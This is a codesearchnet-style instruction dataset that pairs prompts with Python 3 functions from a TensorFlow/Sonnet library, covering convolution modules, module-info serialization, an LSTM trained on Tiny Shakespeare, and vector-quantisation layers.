{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef transpose(self, name=None):\n    if name is None:\n      name = self.module_name + \"_transpose\"\n\n    if self._data_format == DATA_FORMAT_NHWC:\n      stride = self._stride[1:-1]\n    else:  # self._data_format == DATA_FORMAT_NCHW\n      stride = self._stride[2:]\n\n    return Conv2D(output_channels=lambda: self.input_channels,\n                  kernel_shape=self._kernel_shape,\n                  stride=stride,\n                  padding=self._padding,\n                  use_bias=self._use_bias,\n                  initializers=self._initializers,\n                  partitioners=self._partitioners,\n                  regularizers=self._regularizers,\n                  data_format=self._data_format,\n                  custom_getter=self._custom_getter,\n                  name=name)", "response": "Returns matching Conv2D module."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs the convolution weight matrix.", "response": "def _construct_w(self, inputs):\n    \"\"\"Construct the convolution weight matrix.\n\n    Figures out the shape of the weight matrix, initialize it, and return it.\n\n    Args:\n      inputs: A Tensor of shape `data_format` and of type `tf.float16`,\n          `tf.bfloat16` or `tf.float32`.\n\n    Returns:\n      w: A weight matrix of the same type as `inputs` and of shape\n        [kernel_shape, 1, 1].\n    \"\"\"\n    weight_shape = self._kernel_shape + (1, 1)\n\n    if \"w\" not in self._initializers:\n      self._initializers[\"w\"] = create_weight_initializer(weight_shape[:2],\n                                                          dtype=inputs.dtype)\n\n    w = tf.get_variable(\"w\",\n                        shape=weight_shape,\n                        dtype=inputs.dtype,\n                        initializer=self._initializers[\"w\"],\n                        partitioner=self._partitioners.get(\"w\", None),\n                        regularizer=self._regularizers.get(\"w\", None))\n    return w"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\napply a depthwise_conv2d operation on inputs using variable w.", "response": "def _apply_conv(self, inputs, w):\n    \"\"\"Apply a depthwise_conv2d operation on `inputs` using variable `w`.\n\n    Args:\n      inputs: A Tensor of shape `data_format` and of type `tf.float16`,\n          `tf.bfloat16` or `tf.float32`.\n      w: A weight matrix of the same type as `inputs`.\n\n    Returns:\n      outputs: The result of the convolution operation on `inputs`.\n    \"\"\"\n    tiled_weights = tf.tile(w, [1, 1, self._input_channels, 1])\n    outputs = tf.nn.depthwise_conv2d(inputs,\n                                     tiled_weights,\n                                     strides=self.stride,\n                                     padding=self._conv_op_padding,\n                                     data_format=self._data_format)\n    return outputs"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconnect the module into the graph with input Tensor inputs.", "response": "def _construct_w(self, inputs):\n    \"\"\"Connects the module into the graph, with input Tensor `inputs`.\n\n    Args:\n      inputs: A 4D Tensor of shape:\n          [batch_size, input_height, input_width, input_channels]\n          and of type `tf.float16`, `tf.bfloat16` or `tf.float32`.\n\n    Returns:\n      A tuple of two 4D Tensors, each with the same dtype as `inputs`:\n        1. w_dw, the depthwise weight matrix, of shape:\n          [kernel_size, input_channels, channel_multiplier]\n        2. w_pw, the pointwise weight matrix, of shape:\n          [1, 1, channel_multiplier * input_channels, output_channels].\n    \"\"\"\n    depthwise_weight_shape = self._kernel_shape + (self._input_channels,\n                                                   self._channel_multiplier)\n    pointwise_input_size = self._channel_multiplier * self._input_channels\n    pointwise_weight_shape = (1, 1, pointwise_input_size, self._output_channels)\n\n    if \"w_dw\" not in self._initializers:\n      fan_in_shape = depthwise_weight_shape[:2]\n      self._initializers[\"w_dw\"] = create_weight_initializer(fan_in_shape,\n                                                             dtype=inputs.dtype)\n\n    if \"w_pw\" not in self._initializers:\n      fan_in_shape = pointwise_weight_shape[:3]\n      self._initializers[\"w_pw\"] = create_weight_initializer(fan_in_shape,\n                                                             dtype=inputs.dtype)\n\n    w_dw = tf.get_variable(\n        \"w_dw\",\n        shape=depthwise_weight_shape,\n        dtype=inputs.dtype,\n        initializer=self._initializers[\"w_dw\"],\n        partitioner=self._partitioners.get(\"w_dw\", None),\n        regularizer=self._regularizers.get(\"w_dw\", None))\n\n    w_pw = tf.get_variable(\n        \"w_pw\",\n        shape=pointwise_weight_shape,\n        dtype=inputs.dtype,\n        initializer=self._initializers[\"w_pw\"],\n        partitioner=self._partitioners.get(\"w_pw\", None),\n        regularizer=self._regularizers.get(\"w_pw\", None))\n\n    return w_dw, w_pw"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\napplies a sequential_conv2d operation on inputs using w.", "response": "def _apply_conv(self, inputs, w):\n    \"\"\"Apply a `separable_conv2d` operation on `inputs` using `w`.\n\n    Args:\n      inputs: A Tensor of shape `data_format` and of type `tf.float16`,\n          `tf.bfloat16` or `tf.float32`.\n      w: A tuple of weight matrices of the same type as `inputs`, the first\n        being the depthwise weight matrix, and the second being the pointwise\n        weight matrix.\n\n    Returns:\n      outputs: The result of the convolution operation on `inputs`.\n    \"\"\"\n    w_dw, w_pw = w\n    outputs = tf.nn.separable_conv2d(inputs,\n                                     w_dw,\n                                     w_pw,\n                                     rate=self._rate,\n                                     strides=self.stride,\n                                     padding=self._conv_op_padding,\n                                     data_format=self._data_format)\n    return outputs"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\napplying a sequential_conv2d operation on inputs using w.", "response": "def _apply_conv(self, inputs, w):\n    \"\"\"Apply a `separable_conv2d` operation on `inputs` using `w`.\n\n    Args:\n      inputs: A Tensor of shape `data_format` and of type `tf.float16`,\n          `tf.bfloat16` or `tf.float32`.\n      w: A tuple of weight matrices of the same type as `inputs`, the first\n        being the depthwise weight matrix, and the second being the pointwise\n        weight matrix.\n\n    Returns:\n      outputs: The result of the convolution operation on `inputs`.\n    \"\"\"\n    if self._data_format == DATA_FORMAT_NWC:\n      h_dim = 1\n      two_dim_conv_data_format = DATA_FORMAT_NHWC\n    else:\n      h_dim = 2\n      two_dim_conv_data_format = DATA_FORMAT_NCHW\n\n    inputs = tf.expand_dims(inputs, axis=h_dim)\n    two_dim_conv_stride = self.stride[:h_dim] + (1,) + self.stride[h_dim:]\n\n    # Height always precedes width.\n    two_dim_conv_rate = (1,) + self._rate\n\n    w_dw, w_pw = w\n    outputs = tf.nn.separable_conv2d(inputs,\n                                     w_dw,\n                                     w_pw,\n                                     strides=two_dim_conv_stride,\n                                     rate=two_dim_conv_rate,\n                                     padding=self._conv_op_padding,\n                                     data_format=two_dim_conv_data_format)\n    outputs = tf.squeeze(outputs, [h_dim])\n    return outputs"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build(self, *args):\n    net = args\n\n    if not self._layers:\n      # If the sequential is passed a single arg, this will end up being\n      # wrapped in an extra layer of tuple by *args. Normally we internally\n      # handle this in the loop below, but if there are no layers we unpack here\n      # in order to make Sequential([]) act like an identity, which seems right.\n      if len(args) == 1:\n        return args[0]\n      else:\n        return args\n\n    for layer in self._layers:\n      if isinstance(net, tuple):\n        net = layer(*net)\n      else:\n        net = layer(net)\n\n    return net", "response": "Connects the Sequential module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_variables(self, *args, **kwargs):\n    tf.logging.warning(\n        \"Calling Sequential.get_variables, which will always return an empty \"\n        \"tuple. get_variables() can only return variables created directly by \"\n        \"a Module, or created by submodules directly created inside the \"\n        \"Module. Sequential is constructed from already constructed submodules \"\n        \"and so this will always be empty. See the documentation for more \"\n        \"details, but tl;dr if you need to connect some modules sequentially \"\n        \"and call get_variables on the result, writing a simple custom module \"\n        \"is the simplest way. Another option is to call get_all_variables().\")\n    return super(Sequential, self).get_variables(*args, **kwargs)", "response": "Provide a warning that get_variables on Sequential always returns an empty tuple."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a custom getter that applies specified named arguments.", "response": "def override_args(**kwargs):\n  \"\"\"Creates a custom getter that applies specified named arguments.\n\n  Args:\n    **kwargs: Overriding arguments for the custom getter to use in preference\n      the named arguments it's called with.\n\n  Returns:\n    Custom getter.\n  \"\"\"\n\n  override_kwargs = kwargs\n\n  def custom_getter(getter, *args, **kwargs):\n    \"\"\"Custom getter with certain named arguments overridden.\n\n    Args:\n      getter: Underlying variable getter to invoke.\n      *args: Arguments, compatible with those of tf.get_variable.\n      **kwargs: Keyword arguments, compatible with those of tf.get_variable.\n\n    Returns:\n      The result of invoking `getter(*args, **kwargs)` except that certain\n      kwargs entries may have been overridden.\n    \"\"\"\n    kwargs.update(override_kwargs)\n    return getter(*args, **kwargs)\n\n  return custom_getter"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a custom getter that applies specified named arguments.", "response": "def override_default_args(**kwargs):\n  \"\"\"Creates a custom getter that applies specified named arguments.\n\n  The returned custom getter treats the specified named arguments as revised\n  defaults, and does not override any non-`None` argument values supplied by\n  the original get_variable call (or by a nested scope's custom getter).\n\n  Args:\n    **kwargs: Overriding arguments for the custom getter to use in preference\n      the named arguments it's called with.\n\n  Returns:\n    Custom getter.\n  \"\"\"\n\n  override_default_kwargs = kwargs\n\n  def custom_getter(getter, *args, **kwargs):\n    \"\"\"Custom getter with certain named arguments overridden.\n\n    Args:\n      getter: Underlying variable getter to invoke.\n      *args: Arguments, compatible with those of tf.get_variable.\n      **kwargs: Keyword arguments, compatible with those of tf.get_variable.\n\n    Returns:\n      The result of invoking `getter(*args, **kwargs)` except that certain\n      kwargs entries may have been overridden.\n    \"\"\"\n    updated_kwargs = override_default_kwargs.copy()\n    updated_kwargs.update({kw: value for kw, value in six.iteritems(kwargs)\n                           if value is not None})\n    return getter(*args, **updated_kwargs)\n\n  return custom_getter"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build_migrated_variables(checkpoint_reader, name_value_fn):\n\n  names_to_shapes = checkpoint_reader.get_variable_to_shape_map()\n\n  new_name_to_variable = {}\n  name_to_new_name = {}\n\n  for name in names_to_shapes:\n    value = checkpoint_reader.get_tensor(name)\n    new_name, new_value = name_value_fn(name, value)\n    if new_name is None:\n      continue\n\n    name_to_new_name[name] = new_name\n    new_name_to_variable[new_name] = tf.Variable(new_value)\n\n  return new_name_to_variable, name_to_new_name", "response": "Builds the TensorFlow variables of the migrated checkpoint."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _to_proto_sparse_tensor(sparse_tensor, nested_proto,\n                            process_leafs, already_processed):\n  \"\"\"Serializes a `tf.SparseTensor` into `nested_proto`.\n\n  Args:\n    sparse_tensor: An instance of `tf.SparseTensor`.\n    nested_proto: A `module_pb2.NestedData` instance to be filled from\n      `sparse_tensor`.\n    process_leafs: A function to be applied to the leaf valued of the nested\n      structure.\n    already_processed: Set of already processed objects (used to avoid\n      infinite recursion).\n  \"\"\"\n  already_processed.add(id(sparse_tensor))\n  nested_proto.named_tuple.name = _SPARSE_TENSOR_NAME\n  for str_key in _SPARSE_TENSOR_FIELD:\n    tensor = getattr(sparse_tensor, str_key)\n    nested_proto.named_tuple.map[str_key].value = process_leafs(tensor)", "response": "Serializes a tf. SparseTensor into nested_proto."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _from_proto_sparse_tensor(sparse_tensor_proto, process_leafs):\n  if not sparse_tensor_proto.HasField(\"named_tuple\"):\n    raise base_errors.ModuleInfoError(\n        \"Error while deserializing a SparseTensor: expected proto tuple.\")\n  if sparse_tensor_proto.named_tuple.name != _SPARSE_TENSOR_NAME:\n    raise base_errors.ModuleInfoError(\n        \"Error while deserializing a SparseTensor: The name of the tuple \"\n        \"should have been {} but was {}.\".format(\n            _SPARSE_TENSOR_NAME, sparse_tensor_proto.named_tuple.name))\n  named_tuple_map = sparse_tensor_proto.named_tuple.map\n  return tf.SparseTensor(\n      indices=process_leafs(named_tuple_map[\"indices\"].value),\n      values=process_leafs(named_tuple_map[\"values\"].value),\n      dense_shape=process_leafs(named_tuple_map[\"dense_shape\"].value))", "response": "Deserializes a tf. SparseTensor from a protobuf."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _nested_to_proto(nested_value, nested_proto, process_leafs,\n                     already_processed):\n  \"\"\"Serializes `nested_value` into `nested_proto`.\n\n  Args:\n    nested_value: A nested Python value.\n    nested_proto: A `module_pb2.NestedData` instance to be filled from the value\n      in `nested_value`.\n    process_leafs: A function to be applied to the leaf values of the nested\n      structure.\n    already_processed: Set of already processed objects (used to avoid\n      infinite recursion).\n  Raises:\n    ModuleInfoError: If `nested_proto` is not an instance of\n      `module_pb2.NestedData`.\n  \"\"\"\n  if not isinstance(nested_proto, module_pb2.NestedData):\n    raise base_errors.ModuleInfoError(\"Expected module_pb2.NestedData.\")\n\n  # If this object was already processed, mark as \"unserializable\"\n  # to avoid infinite recursion.\n  if id(nested_value) in already_processed:\n    nested_proto.value = \"\"\n    return\n\n  # Check special types.\n  for type_name, type_info in six.iteritems(_TO_PROTO_SPECIAL_TYPES):\n    if type_info.check(nested_value):\n      nested_proto.special_type.name = type_name\n      type_info.to_proto(\n          nested_value, nested_proto.special_type.object,\n          process_leafs, already_processed)\n      return\n\n  # Check standard types.\n  if _is_iterable(nested_value):\n    # Mark this container as \"already processed\" to avoid infinite recursion.\n    already_processed.add(id(nested_value))\n    if isinstance(nested_value, dict):\n      nested_proto.dict.SetInParent()\n      for key, child in six.iteritems(nested_value):\n        str_key = str(key)\n        child_proto = nested_proto.dict.map[str_key]\n        _nested_to_proto(child, child_proto, process_leafs, already_processed)\n    elif isinstance(nested_value, tuple):\n      # NamedTuple?\n      if _is_namedtuple(nested_value):\n        nested_proto.named_tuple.name = type(nested_value).__name__\n        for str_key in nested_value._fields:\n          child = getattr(nested_value, str_key)\n          child_proto = nested_proto.named_tuple.map[str_key]\n          _nested_to_proto(child, child_proto, process_leafs, already_processed)\n      else:\n        nested_proto.tuple.SetInParent()\n        for child in nested_value:\n          child_proto = nested_proto.tuple.list.add()\n          _nested_to_proto(child, child_proto, process_leafs, already_processed)\n    else:\n      nested_proto.list.SetInParent()\n      for child in nested_value:\n        child_proto = nested_proto.list.list.add()\n        _nested_to_proto(child, child_proto, process_leafs, already_processed)\n  else:\n    nested_proto.value = process_leafs(nested_value)", "response": "Serializes a nested Python value into a nested_proto."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nserializing a module_info into a proto2. SonnetModule.", "response": "def _module_info_to_proto(module_info, export_scope=None):\n  \"\"\"Serializes `module_into`.\n\n  Args:\n    module_info: An instance of `ModuleInfo`.\n    export_scope: Optional `string`. Name scope to remove.\n\n  Returns:\n    An instance of `module_pb2.SonnetModule`.\n  \"\"\"\n  def strip_name_scope(name_scope):\n    return ops.strip_name_scope(name_scope, export_scope)\n  def process_leafs(value):\n    return strip_name_scope(_graph_element_to_path(value))\n  module_info_def = module_pb2.SonnetModule(\n      module_name=module_info.module_name,\n      scope_name=strip_name_scope(module_info.scope_name),\n      class_name=module_info.class_name)\n  for connected_subgraph in module_info.connected_subgraphs:\n    connected_subgraph_info_def = module_info_def.connected_subgraphs.add()\n    connected_subgraph_info_def.name_scope = strip_name_scope(\n        connected_subgraph.name_scope)\n    _nested_to_proto(\n        connected_subgraph.inputs,\n        connected_subgraph_info_def.inputs,\n        process_leafs, set())\n    _nested_to_proto(\n        connected_subgraph.outputs,\n        connected_subgraph_info_def.outputs,\n        process_leafs, set())\n  return module_info_def"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _module_info_from_proto(module_info_def, import_scope=None):\n  graph = tf.get_default_graph()\n  def prepend_name_scope(name_scope):\n    return ops.prepend_name_scope(name_scope, import_scope)\n  def process_leafs(name):\n    return _path_to_graph_element(prepend_name_scope(name), graph)\n  connected_subgraphs = []\n  module_info = ModuleInfo(\n      module_name=module_info_def.module_name,\n      scope_name=prepend_name_scope(module_info_def.scope_name),\n      class_name=module_info_def.class_name,\n      connected_subgraphs=connected_subgraphs)\n  for connected_subgraph_def in module_info_def.connected_subgraphs:\n    connected_subgraph = ConnectedSubGraph(\n        module=module_info,\n        name_scope=prepend_name_scope(connected_subgraph_def.name_scope),\n        inputs=_nested_from_proto(\n            connected_subgraph_def.inputs, process_leafs),\n        outputs=_nested_from_proto(\n            connected_subgraph_def.outputs, process_leafs))\n    connected_subgraphs.append(connected_subgraph)\n  return module_info", "response": "Deserializes `module_info_def` proto.\n\n  Args:\n    module_info_def: An instance of `module_pb2.SonnetModule`.\n    import_scope: Optional `string`. Name scope to use.\n\n  Returns:\n    An instance of `ModuleInfo`.\n\n  Raises:\n    base_errors.ModuleInfoError: If the probobuf is of the wrong type or\n      if some of its fields are missing."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _module_info_from_proto_safe(module_info_def, import_scope=None):\n  try:\n    return _module_info_from_proto(module_info_def, import_scope)\n  except Exception as e:  # pylint: disable=broad-except\n    logging.warning(\n        \"Error encountered when deserializing sonnet ModuleInfo:\\n%s\", str(e))\n    return None", "response": "Deserializes the module_info_def proto without raising exceptions."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _configure_saver(checkpoint_dir, checkpoint_interval):\n  saver = tf.train.Saver()\n  return tf.train.CheckpointSaverHook(\n      checkpoint_dir=checkpoint_dir,\n      save_steps=checkpoint_interval,\n      saver=saver)", "response": "Returns a tf. train. CheckpointSaverHook for autosaving checkpoints."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef build_graph(lstm_depth=3, batch_size=32, num_embedding=32, num_hidden=128,\n                truncation_length=64, sample_length=1000, max_grad_norm=5,\n                initial_learning_rate=0.1, reduce_learning_rate_multiplier=0.1,\n                optimizer_epsilon=0.01):\n  \"\"\"Constructs the computation graph.\"\"\"\n\n  # Get datasets.\n  dataset_train = dataset_shakespeare.TinyShakespeareDataset(\n      num_steps=truncation_length,\n      batch_size=batch_size,\n      subset=\"train\",\n      random=True,\n      name=\"shake_train\")\n\n  dataset_valid = dataset_shakespeare.TinyShakespeareDataset(\n      num_steps=truncation_length,\n      batch_size=batch_size,\n      subset=\"valid\",\n      random=False,\n      name=\"shake_valid\")\n\n  dataset_test = dataset_shakespeare.TinyShakespeareDataset(\n      num_steps=truncation_length,\n      batch_size=batch_size,\n      subset=\"test\",\n      random=False,\n      name=\"shake_test\")\n\n  # Define model.\n  model = TextModel(\n      num_embedding=num_embedding,\n      num_hidden=num_hidden,\n      lstm_depth=lstm_depth,\n      output_size=dataset_valid.vocab_size,\n      use_dynamic_rnn=True,\n      use_skip_connections=True)\n\n  # Get the training loss.\n  train_input_sequence, train_target_sequence = dataset_train()\n  train_output_sequence_logits, train_final_state = model(train_input_sequence)  # pylint: disable=not-callable\n  train_loss = dataset_train.cost(train_output_sequence_logits,\n                                  train_target_sequence)\n\n  # Get the validation loss.\n  valid_input_sequence, valid_target_sequence = dataset_valid()\n  valid_output_sequence_logits, _ = model(valid_input_sequence)  # pylint: disable=not-callable\n  valid_loss = dataset_valid.cost(valid_output_sequence_logits,\n                                  valid_target_sequence)\n\n  # Get the test loss.\n  test_input_sequence, test_target_sequence = dataset_test()\n  test_output_sequence_logits, _ = model(test_input_sequence)  # pylint: disable=not-callable\n  test_loss = dataset_test.cost(test_output_sequence_logits,\n                                test_target_sequence)\n\n  # Build graph to sample some strings during training.\n  initial_logits = train_output_sequence_logits[truncation_length - 1]\n  train_generated_string = model.generate_string(\n      initial_logits=initial_logits,\n      initial_state=train_final_state,\n      sequence_length=sample_length)\n\n  # Set up global norm clipping of gradients.\n  trainable_variables = tf.trainable_variables()\n  grads, _ = tf.clip_by_global_norm(\n      tf.gradients(train_loss, trainable_variables), max_grad_norm)\n\n  # Get learning rate and define annealing.\n  learning_rate = tf.get_variable(\n      \"learning_rate\",\n      shape=[],\n      dtype=tf.float32,\n      initializer=tf.constant_initializer(initial_learning_rate),\n      trainable=False)\n  reduce_learning_rate = learning_rate.assign(\n      learning_rate * reduce_learning_rate_multiplier)\n\n  # Get training step counter.\n  global_step = tf.get_variable(\n      name=\"global_step\",\n      shape=[],\n      dtype=tf.int64,\n      initializer=tf.zeros_initializer(),\n      trainable=False,\n      collections=[tf.GraphKeys.GLOBAL_VARIABLES, tf.GraphKeys.GLOBAL_STEP])\n\n  # Define optimizer and training step.\n  optimizer = tf.train.AdamOptimizer(\n      learning_rate, epsilon=optimizer_epsilon)\n  train_step = optimizer.apply_gradients(\n      zip(grads, trainable_variables),\n      global_step=global_step)\n\n  graph_tensors = {\n      \"train_loss\": train_loss,\n      \"valid_loss\": valid_loss,\n      \"test_loss\": test_loss,\n      \"train_generated_string\": train_generated_string,\n      \"reduce_learning_rate\": reduce_learning_rate,\n      \"global_step\": global_step,\n      \"train_step\": train_step\n  }\n\n  # Return dataset_train for translation to human readable text.\n  return graph_tensors, dataset_train", "response": "Constructs the computation graph."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef train(num_training_iterations, report_interval,\n          reduce_learning_rate_interval):\n  \"\"\"Trains a deep LSTM model on the Tiny Shakespeare dataset.\"\"\"\n\n  # Build the computation graph.\n  graph_tensors, dataset_train = build_graph(\n      lstm_depth=FLAGS.lstm_depth, batch_size=FLAGS.batch_size,\n      num_embedding=FLAGS.num_embedding, num_hidden=FLAGS.num_hidden,\n      truncation_length=FLAGS.truncation_length,\n      sample_length=FLAGS.sample_length, max_grad_norm=FLAGS.max_grad_norm,\n      initial_learning_rate=FLAGS.learning_rate,\n      reduce_learning_rate_multiplier=FLAGS.reduce_learning_rate_multiplier,\n      optimizer_epsilon=FLAGS.optimizer_epsilon)\n\n  # Configure a checkpoint saver.\n  saver_hook = _configure_saver(FLAGS.checkpoint_dir,\n                                FLAGS.checkpoint_interval)\n\n  # Train the network.\n  with tf.train.SingularMonitoredSession(\n      hooks=[saver_hook], checkpoint_dir=FLAGS.checkpoint_dir) as sess:\n\n    start_iteration = sess.run(graph_tensors[\"global_step\"])\n\n    for train_iteration in range(start_iteration, num_training_iterations):\n      if (train_iteration + 1) % report_interval == 0:\n        train_loss_v, valid_loss_v, _ = sess.run(\n            (graph_tensors[\"train_loss\"],\n             graph_tensors[\"valid_loss\"],\n             graph_tensors[\"train_step\"]))\n\n        train_generated_string_v = sess.run(\n            graph_tensors[\"train_generated_string\"])\n\n        train_generated_string_human = dataset_train.to_human_readable(\n            (train_generated_string_v, 0), indices=[0])\n\n        tf.logging.info(\"%d: Training loss %f. Validation loss %f. Sample = %s\",\n                        train_iteration,\n                        train_loss_v,\n                        valid_loss_v,\n                        train_generated_string_human)\n      else:\n        train_loss_v, _ = sess.run((graph_tensors[\"train_loss\"],\n                                    graph_tensors[\"train_step\"]))\n        tf.logging.info(\"%d: Training loss %f.\", train_iteration, train_loss_v)\n\n      if (train_iteration + 1) % reduce_learning_rate_interval == 0:\n        sess.run(graph_tensors[\"reduce_learning_rate\"])\n        tf.logging.info(\"Reducing learning rate.\")\n\n    test_loss = sess.run(graph_tensors[\"test_loss\"])\n    tf.logging.info(\"Test loss %f\", test_loss)", "response": "Trains a deep LSTM model on the Tiny Shakespeare dataset."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _build(self, one_hot_input_sequence):\n\n    input_shape = one_hot_input_sequence.get_shape()\n    batch_size = input_shape[1]\n\n    batch_embed_module = snt.BatchApply(self._embed_module)\n    input_sequence = batch_embed_module(one_hot_input_sequence)\n    input_sequence = tf.nn.relu(input_sequence)\n\n    initial_state = self._core.initial_state(batch_size)\n\n    if self._use_dynamic_rnn:\n      output_sequence, final_state = tf.nn.dynamic_rnn(\n          cell=self._core,\n          inputs=input_sequence,\n          time_major=True,\n          initial_state=initial_state)\n    else:\n      rnn_input_sequence = tf.unstack(input_sequence)\n      output, final_state = tf.contrib.rnn.static_rnn(\n          cell=self._core,\n          inputs=rnn_input_sequence,\n          initial_state=initial_state)\n      output_sequence = tf.stack(output)\n\n    batch_output_module = snt.BatchApply(self._output_module)\n    output_sequence_logits = batch_output_module(output_sequence)\n\n    return output_sequence_logits, final_state", "response": "Builds the deep LSTM model sub - graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds a sub - graph to generate a string from the model.", "response": "def generate_string(self, initial_logits, initial_state, sequence_length):\n    \"\"\"Builds sub-graph to generate a string, sampled from the model.\n\n    Args:\n      initial_logits: Starting logits to sample from.\n      initial_state: Starting state for the RNN core.\n      sequence_length: Number of characters to sample.\n\n    Returns:\n      A Tensor of characters, with dimensions `[sequence_length, batch_size,\n      output_size]`.\n    \"\"\"\n\n    current_logits = initial_logits\n    current_state = initial_state\n\n    generated_letters = []\n    for _ in range(sequence_length):\n      # Sample a character index from distribution.\n      char_index = tf.squeeze(tf.multinomial(current_logits, 1))\n      char_one_hot = tf.one_hot(char_index, self._output_size, 1.0, 0.0)\n      generated_letters.append(char_one_hot)\n\n      # Feed character back into the deep_lstm.\n      gen_out_seq, current_state = self._core(\n          tf.nn.relu(self._embed_module(char_one_hot)),\n          current_state)\n      current_logits = self._output_module(gen_out_seq)\n\n    generated_string = tf.stack(generated_letters)\n\n    return generated_string"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconnect the module to some inputs.", "response": "def _build(self, inputs, is_training):\n    \"\"\"Connects the module to some inputs.\n\n    Args:\n      inputs: Tensor, final dimension must be equal to embedding_dim. All other\n        leading dimensions will be flattened and treated as a large batch.\n      is_training: boolean, whether this connection is to training data.\n\n    Returns:\n      dict containing the following keys and values:\n        quantize: Tensor containing the quantized version of the input.\n        loss: Tensor containing the loss to optimize.\n        perplexity: Tensor containing the perplexity of the encodings.\n        encodings: Tensor containing the discrete encodings, ie which element\n          of the quantized space each input element was mapped to.\n        encoding_indices: Tensor containing the discrete encoding indices, ie\n          which element of the quantized space each input element was mapped to.\n    \"\"\"\n    # Assert last dimension is same as self._embedding_dim\n    input_shape = tf.shape(inputs)\n    with tf.control_dependencies([\n        tf.Assert(tf.equal(input_shape[-1], self._embedding_dim),\n                  [input_shape])]):\n      flat_inputs = tf.reshape(inputs, [-1, self._embedding_dim])\n\n    distances = (tf.reduce_sum(flat_inputs**2, 1, keepdims=True)\n                 - 2 * tf.matmul(flat_inputs, self._w)\n                 + tf.reduce_sum(self._w ** 2, 0, keepdims=True))\n\n    encoding_indices = tf.argmax(- distances, 1)\n    encodings = tf.one_hot(encoding_indices, self._num_embeddings)\n    encoding_indices = tf.reshape(encoding_indices, tf.shape(inputs)[:-1])\n    quantized = self.quantize(encoding_indices)\n\n    e_latent_loss = tf.reduce_mean((tf.stop_gradient(quantized) - inputs) ** 2)\n    q_latent_loss = tf.reduce_mean((quantized - tf.stop_gradient(inputs)) ** 2)\n    loss = q_latent_loss + self._commitment_cost * e_latent_loss\n\n    quantized = inputs + tf.stop_gradient(quantized - inputs)\n    avg_probs = tf.reduce_mean(encodings, 0)\n    perplexity = tf.exp(- tf.reduce_sum(avg_probs * tf.log(avg_probs + 1e-10)))\n\n    return {'quantize': quantized,\n            'loss': loss,\n            'perplexity': perplexity,\n            'encodings': encodings,\n            'encoding_indices': encoding_indices,}"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _build(self, inputs, is_training):\n    # Ensure that the weights are read fresh for each timestep, which otherwise\n    # would not be guaranteed in an RNN setup. Note that this relies on inputs\n    # having a data dependency with the output of the previous timestep - if\n    # this is not the case, there is no way to serialize the order of weight\n    # updates within the module, so explicit external dependencies must be used.\n    with tf.control_dependencies([inputs]):\n      w = self._w.read_value()\n    input_shape = tf.shape(inputs)\n    with tf.control_dependencies([\n        tf.Assert(tf.equal(input_shape[-1], self._embedding_dim),\n                  [input_shape])]):\n      flat_inputs = tf.reshape(inputs, [-1, self._embedding_dim])\n\n    distances = (tf.reduce_sum(flat_inputs**2, 1, keepdims=True)\n                 - 2 * tf.matmul(flat_inputs, w)\n                 + tf.reduce_sum(w ** 2, 0, keepdims=True))\n\n    encoding_indices = tf.argmax(- distances, 1)\n    encodings = tf.one_hot(encoding_indices, self._num_embeddings)\n    encoding_indices = tf.reshape(encoding_indices, tf.shape(inputs)[:-1])\n    quantized = self.quantize(encoding_indices)\n    e_latent_loss = tf.reduce_mean((tf.stop_gradient(quantized) - inputs) ** 2)\n\n    if is_training:\n      updated_ema_cluster_size = moving_averages.assign_moving_average(\n          self._ema_cluster_size, tf.reduce_sum(encodings, 0), self._decay)\n      dw = tf.matmul(flat_inputs, encodings, transpose_a=True)\n      updated_ema_w = moving_averages.assign_moving_average(self._ema_w, dw,\n                                                            self._decay)\n      n = tf.reduce_sum(updated_ema_cluster_size)\n      updated_ema_cluster_size = (\n          (updated_ema_cluster_size + self._epsilon)\n          / (n + self._num_embeddings * self._epsilon) * n)\n\n      normalised_updated_ema_w = (\n          updated_ema_w / tf.reshape(updated_ema_cluster_size, [1, -1]))\n      with tf.control_dependencies([e_latent_loss]):\n        update_w = tf.assign(self._w, normalised_updated_ema_w)\n        with tf.control_dependencies([update_w]):\n          loss = self._commitment_cost * e_latent_loss\n\n    else:\n      loss = self._commitment_cost * e_latent_loss\n    quantized = inputs + tf.stop_gradient(quantized - inputs)\n    avg_probs = tf.reduce_mean(encodings, 0)\n    perplexity = tf.exp(- tf.reduce_sum(avg_probs * tf.log(avg_probs + 1e-10)))\n\n    return {'quantize': quantized,\n            'loss': loss,\n            'perplexity': perplexity,\n            'encodings': encodings,\n            'encoding_indices': encoding_indices,}", "response": "Connects the module to some inputs."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nadding two arbitrarily nested Tensors.", "response": "def _nested_add(nested_a, nested_b):\n  \"\"\"Add two arbitrarily nested `Tensors`.\"\"\"\n  return nest.map(lambda a, b: a + b, nested_a, nested_b)"}
